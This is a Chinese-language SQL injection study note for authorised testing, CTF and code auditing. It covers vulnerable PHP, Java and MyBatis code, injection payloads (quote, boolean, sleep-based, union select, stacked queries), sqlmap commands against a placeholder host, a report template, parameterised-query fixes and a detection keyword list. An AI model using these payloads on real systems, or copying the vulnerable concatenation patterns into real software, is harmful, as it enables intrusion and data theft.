# SQL Injection

# SQL 注入复现笔记

> 本文仅用于授权安全测试、靶场练习、CTF 学习和代码审计学习。
> 未经授权不得对真实网站进行扫描、注入测试、数据枚举或漏洞利用。

---

## 一、SQL 注入是什么

SQL 注入，英文为 **SQL Injection**，简称 **SQLi**。

它是指 Web 应用在接收用户输入后，没有对输入内容进行安全处理，直接将用户输入拼接进 SQL 语句中，导致攻击者可以改变原本 SQL 的语义。

简单理解：

```text
用户输入的数据被当成 SQL 代码执行了。
```

例如后端代码：

```php
$id = $_GET['id'];
$sql = "select * from users where id = '$id'";
```

如果正常访问：

```text
?id=1
```

SQL 语句是：

```sql
select * from users where id = '1';
```

如果用户输入：

```text
?id=1' or '1'='1
```

SQL 语句可能变成：

```sql
select * from users where id = '1' or '1'='1';
```

这样就改变了原来的查询逻辑。

---

## 二、SQL 注入常见位置

SQL 注入经常出现在用户可控参数中，例如：

```text
登录框
搜索框
新闻详情页
商品详情页
用户查询接口
订单查询接口
分页参数
排序参数
后台筛选功能
文件下载参数
API 接口参数
```

常见参数名：

```text
id
uid
userId
orderId
newsId
type
cat
page
keyword
search
name
sort
order
```

示例 URL：

```text
http://example.com/news.php?id=1
http://example.com/user?id=1001
http://example.com/search?keyword=test
http://example.com/order/detail?orderId=2001
```

---

## 三、SQL 注入产生原因

SQL 注入的根本原因是：

```text
用户输入没有经过安全处理，就被拼接进 SQL 语句中执行。
```

危险写法示例：

```php
$id = $_GET['id'];
$sql = "select * from users where id = '$id'";
$result = mysqli_query($conn, $sql);
```

Java 中的危险写法：

```java
String id = request.getParameter("id");
String sql = "select * from users where id = '" + id + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

MyBatis 中的危险写法：

```java
@Select("select * from users where name = '${name}'")
User findByName(@Param("name") String name);
```

这里的 `${}` 是字符串拼接，容易造成 SQL 注入。

---

## 四、SQL 注入判断方法

### 4.1 单引号判断

原始请求：

```text
http://target.com/news.php?id=1
```

测试：

```text
http://target.com/news.php?id=1'
```

如果页面出现数据库错误，例如：

```text
SQL syntax error
You have an error in your SQL syntax
ORA-
ODBC
MySQL
MariaDB
PostgreSQL
```

说明参数可能进入了 SQL 语句。

判断结果：

```text
正常页面 + 单引号报错 = 可能存在 SQL 注入
```

---

### 4.2 布尔条件判断

测试真条件：

```text
?id=1 and 1=1
```

测试假条件：

```text
?id=1 and 1=2
```

如果：

```text
?id=1 and 1=1 页面正常
?id=1 and 1=2 页面异常、空白或内容不同
```

说明参数可能影响了 SQL 查询结果。

判断结果：

```text
真条件和假条件页面明显不同 = 可能存在布尔型 SQL 注入
```

---

### 4.3 数字型与字符型判断

#### 数字型注入

原始 SQL 可能是：

```sql
select * from news where id = 1;
```

测试：

```text
?id=1 and 1=1
?id=1 and 1=2
```

数字型一般不需要闭合引号。

---

#### 字符型注入

原始 SQL 可能是：

```sql
select * from users where username = 'admin';
```

测试：

```text
?name=admin' and '1'='1
?name=admin' and '1'='2
```

字符型需要考虑单引号闭合。

---

### 4.4 时间盲注判断

如果页面没有明显回显，也没有报错，可以使用时间延迟判断。

MySQL 常见测试：

```text
?id=1 and sleep(5)
```

或者字符型：

```text
?id=1' and sleep(5)--+
```

如果响应明显延迟，例如延迟 5 秒左右，说明可能存在时间盲注。

判断结果：

```text
构造 sleep 后响应明显变慢 = 可能存在时间盲注
```

注意：

```text
时间盲注测试应控制频率，不要频繁请求，避免影响业务。
```

---

### 4.5 联合查询判断

联合查询常用于有页面回显的场景。

第一步：判断字段数量。

```text
?id=1 order by 1
?id=1 order by 2
?id=1 order by 3
?id=1 order by 4
```

如果：

```text
order by 3 正常
order by 4 报错
```

说明字段数量可能是 3。

第二步：判断回显位置。

```text
?id=-1 union select 1,2,3
```

如果页面显示了 `2` 或 `3`，说明对应位置可以回显查询结果。

---

## 五、手工注入流程

以下流程以授权靶场为例。

目标示例：

```text
http://target.com/news.php?id=1
```

---

### 5.1 第一步：确认参数是否可控

访问：

```text
/news.php?id=1
/news.php?id=2
```

观察页面内容是否变化。

如果不同 id 返回不同内容，说明参数参与了后端查询。

---

### 5.2 第二步：判断是否存在 SQL 注入

测试单引号：

```text
/news.php?id=1'
```

观察是否报错。

测试布尔条件：

```text
/news.php?id=1 and 1=1
/news.php?id=1 and 1=2
```

如果 `1=1` 和 `1=2` 页面不同，说明存在注入可能。

---

### 5.3 第三步：判断注入类型

数字型测试：

```text
?id=1 and 1=1
?id=1 and 1=2
```

字符型测试：

```text
?id=1' and '1'='1
?id=1' and '1'='2
```

如果数字型 payload 生效，可能是数字型注入。

如果字符型 payload 生效，可能是字符型注入。

---

### 5.4 第四步：判断字段数量

使用 `order by`：

```text
?id=1 order by 1
?id=1 order by 2
?id=1 order by 3
?id=1 order by 4
```

判断方法：

```text
前面正常，某个数字开始报错，报错前的最大数字就是字段数量。
```

例如：

```text
order by 3 正常
order by 4 报错
```

说明查询字段数量可能是 3。

---

### 5.5 第五步：判断回显位置

假设字段数量是 3：

```text
?id=-1 union select 1,2,3
```

这里使用 `id=-1` 是为了让原查询结果为空，使联合查询结果更容易显示出来。

如果页面显示：

```text
2
```

说明第二个字段位置有回显。

如果页面显示：

```text
3
```

说明第三个字段位置有回显。

---

### 5.6 第六步：获取数据库基础信息

在有授权的靶场中，可以使用最小化查询证明漏洞存在。

MySQL 常见函数：

```sql
database()
user()
version()
```

示例：

```text
?id=-1 union select 1,database(),3
```

或者：

```text
?id=-1 union select 1,user(),version()
```

可以证明：

```text
当前数据库名
当前数据库用户
数据库版本
```

注意：

```text
真实授权测试中，只需要最小化证明漏洞存在，不应进行大规模数据读取。
```

---

### 5.7 第七步：判断数据库类型

常见数据库特征：

| 数据库        | 特征                                            |
| ---------- | --------------------------------------------- |
| MySQL      | `database()`、`version()`、`information_schema` |
| SQL Server | `@@version`、`db_name()`                       |
| Oracle     | `dual`、`user_tables`                          |
| PostgreSQL | `current_database()`、`pg_catalog`             |
| SQLite     | `sqlite_master`                               |

MySQL 示例：

```text
?id=-1 union select 1,database(),version()
```

SQL Server 示例：

```text
?id=-1 union select 1,db_name(),@@version
```

Oracle 示例：

```text
?id=-1 union select 1,user,null from dual
```

---

## 六、常见 SQL 注入类型

### 6.1 报错注入

页面会显示数据库错误信息。

特点：

```text
容易判断
能看到 SQL 报错
常见于调试模式开启或错误处理不当
```

---

### 6.2 布尔盲注

页面不显示 SQL 报错，但真条件和假条件页面不同。

特点：

```text
通过页面差异判断结果
速度较慢
适合无明显回显场景
```

---

### 6.3 时间盲注

页面没有明显差异，通过响应时间判断。

特点：

```text
通过 sleep 延迟判断
速度慢
测试时要控制频率
```

---

### 6.4 联合查询注入

页面存在回显位置，可以使用 `union select` 拼接查询结果。

特点：

```text
需要知道字段数量
需要有回显位置
适合有页面输出的场景
```

---

### 6.5 堆叠查询注入

允许一次执行多条 SQL 语句。

示例形式：

```text
?id=1;select version()
```

特点：

```text
危险性高
是否支持取决于数据库和后端驱动
真实测试中应谨慎验证
```

---

## 七、sqlmap 辅助验证

sqlmap 是常见的 SQL 注入自动化检测工具。

注意：

```text
sqlmap 只能在授权环境中使用。
真实业务系统中应控制扫描强度，避免影响服务。
```

---

### 7.1 基础检测

目标：

```text
http://target.com/news.php?id=1
```

命令：

```bash
sqlmap -u "http://target.com/news.php?id=1" --batch
```

参数含义：

```text
-u：指定目标 URL
--batch：使用默认选项，减少交互
```

---

### 7.2 指定参数检测

如果 URL 中有多个参数，只测试 `id` 参数：

```bash
sqlmap -u "http://target.com/news.php?id=1&type=2" -p id --batch
```

参数含义：

```text
-p id：只测试 id 参数
```

---

### 7.3 降低测试强度

授权测试中建议先使用较低强度：

```bash
sqlmap -u "http://target.com/news.php?id=1" --level=1 --risk=1 --batch
```

参数含义：

```text
--level：测试等级，越高测试点越多
--risk：风险等级，越高可能使用更激进 payload
```

建议：

```text
真实授权项目中优先使用 level=1、risk=1。
只有在明确授权且不影响业务时，才提高等级。
```

---

### 7.4 使用请求包检测

对于 POST 请求、Cookie、Token、复杂 Header，建议从 Burp Suite 保存请求包。

保存为：

```text
request.txt
```

sqlmap 命令：

```bash
sqlmap -r request.txt --batch
```

指定参数：

```bash
sqlmap -r request.txt -p username --batch
```

适合场景：

```text
POST 登录框
JSON 接口
带 Cookie 的后台接口
带 Authorization Token 的 API
复杂请求头
```

---

### 7.5 检测当前数据库信息

在授权靶场中，可以使用：

```bash
sqlmap -u "http://target.com/news.php?id=1" --current-db --batch
```

含义：

```text
--current-db：获取当前数据库名
```

也可以查看数据库用户：

```bash
sqlmap -u "http://target.com/news.php?id=1" --current-user --batch
```

查看数据库版本：

```bash
sqlmap -u "http://target.com/news.php?id=1" --banner --batch
```

注意：

```text
真实项目中应以最小化证明为原则，不建议直接枚举全部数据库或导出数据。
```

---

### 7.6 sqlmap 结果怎么看

如果存在注入，sqlmap 可能输出类似：

```text
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind
```

或者：

```text
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query
```

说明：

```text
Parameter：存在问题的参数
Type：注入类型
Title：检测到的 payload 类型
```

常见类型：

```text
boolean-based blind：布尔盲注
time-based blind：时间盲注
error-based：报错注入
UNION query：联合查询注入
stacked queries：堆叠查询
```

---

## 八、SQL 注入复现报告模板

```text
漏洞名称：SQL 注入漏洞

漏洞位置：
http://target.com/news.php?id=1

漏洞参数：
id

漏洞类型：
布尔盲注 / 报错注入 / 联合查询注入 / 时间盲注

漏洞等级：
高危

漏洞描述：
目标系统在处理 id 参数时，未对用户输入进行有效过滤或参数化查询，导致用户输入被拼接进 SQL 语句执行。攻击者可通过构造特殊参数改变 SQL 查询逻辑，造成数据泄露风险。

判断过程：
1. 访问正常参数 id=1，页面正常返回。
2. 添加单引号 id=1'，页面出现数据库错误或响应异常。
3. 使用 id=1 and 1=1 页面正常。
4. 使用 id=1 and 1=2 页面异常。
5. 判断 id 参数存在 SQL 注入风险。

证明方式：
使用最小化 payload 获取当前数据库名或数据库版本，证明 SQL 注入存在。

风险影响：
攻击者可能读取数据库中的敏感信息，甚至在部分场景下进一步获取系统权限。

修复建议：
使用预编译 SQL，避免字符串拼接；对参数进行白名单校验；关闭详细错误回显；数据库账户最小权限。
```

---

## 九、修复建议

### 9.1 使用预编译语句

Java 安全写法：

```java
String sql = "select * from users where id = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setInt(1, id);
ResultSet rs = ps.executeQuery();
```

PHP PDO 安全写法：

```php
$stmt = $pdo->prepare("select * from users where id = ?");
$stmt->execute([$id]);
```

MyBatis 安全写法：

```java
@Select("select * from users where id = #{id}")
User findById(@Param("id") Integer id);
```

避免：

```java
@Select("select * from users where id = ${id}")
```

---

### 9.2 输入校验

对参数进行白名单校验。

例如 id 只能是数字：

```java
if (!id.matches("\\d+")) {
    throw new IllegalArgumentException("Invalid id");
}
```

排序字段只能在白名单中选择：

```java
List<String> allowed = Arrays.asList("id", "name", "create_time");
if (!allowed.contains(orderBy)) {
    throw new IllegalArgumentException("Invalid order field");
}
```

---

### 9.3 关闭详细错误回显

生产环境不应直接显示数据库错误。

错误示例：

```text
You have an error in your SQL syntax near ...
```

安全做法：

```text
前端统一显示：系统异常，请稍后重试
后端日志记录详细错误
不要把 SQL 错误返回给用户
```

---

### 9.4 数据库最小权限

Web 应用连接数据库的账号不应使用 root 或 DBA 权限。

建议：

```text
只授予业务所需权限
禁止使用 root 账号连接业务数据库
禁止 Web 账号拥有 DROP、FILE、SUPER 等高危权限
按业务模块划分数据库权限
```

---

### 9.5 使用安全框架与 ORM

建议使用：

```text
PreparedStatement
MyBatis #{}
JPA / Hibernate 参数绑定
Spring JdbcTemplate 参数绑定
```

避免：

```text
字符串拼接 SQL
MyBatis ${}
动态拼接 order by、like、in 参数
```

如果必须动态拼接，例如排序字段，应使用白名单。

---

### 9.6 加强日志与告警

记录异常请求：

```text
SQL 错误
大量单引号请求
包含 union select 的请求
包含 sleep、benchmark 的请求
响应时间异常请求
同一 IP 高频测试
```

结合：

```text
WAF
IDS
日志平台
安全告警
```

---

## 十、代码审计中的 SQL 注入判断

代码审计时可以按照：

```text
Source → 数据流 → Sink
```

Source 点：

```java
@RequestParam
@PathVariable
@RequestBody
request.getParameter()
request.getHeader()
```

Sink 点：

```java
Statement.executeQuery()
Statement.executeUpdate()
JdbcTemplate.query()
JdbcTemplate.update()
MyBatis ${}
```

危险代码：

```java
String name = request.getParameter("name");
String sql = "select * from users where name = '" + name + "'";
ResultSet rs = stmt.executeQuery(sql);
```

分析：

```text
Source：request.getParameter("name")
数据流：name → SQL 字符串拼接
Sink：executeQuery(sql)
结论：疑似 SQL 注入
```

安全代码：

```java
String sql = "select * from users where name = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, name);
```

---

## 十一、学习靶场推荐

适合练习 SQL 注入的靶场：

```text
DVWA
Pikachu
sqli-labs
WebGoat
PortSwigger Web Security Academy
BUUOJ Web 题
CTFHub SQL 注入模块
```

建议练习顺序：

```text
1. 数字型注入
2. 字符型注入
3. 报错注入
4. 布尔盲注
5. 时间盲注
6. 联合查询注入
7. Cookie 注入
8. POST 注入
9. Header 注入
10. 二次注入
```

---

## 十二、总结

SQL 注入判断核心：

```text
用户输入是否进入 SQL 查询
输入是否改变 SQL 语义
页面是否因真假条件产生差异
是否存在错误回显、时间延迟或联合查询回显
```

手工测试流程：

```text
1. 找参数
2. 判断参数是否影响页面
3. 单引号测试
4. 布尔条件测试
5. 判断数字型或字符型
6. 判断字段数量
7. 判断回显位置
8. 最小化证明数据库信息
```

sqlmap 辅助验证：

```text
1. 使用 -u 测试 GET 参数
2. 使用 -r 测试复杂请求包
3. 使用 -p 指定参数
4. 使用 --level=1 --risk=1 控制强度
5. 只做最小化验证，不随意导出数据
```

修复核心：

```text
预编译 SQL
参数白名单
关闭错误回显
数据库最小权限
日志监控告警
避免 MyBatis ${}
```

一句话总结：

```text
SQL 注入的本质是用户输入被当作 SQL 代码执行，防护的核心是让用户输入永远只作为数据，而不是 SQL 语句的一部分。
```
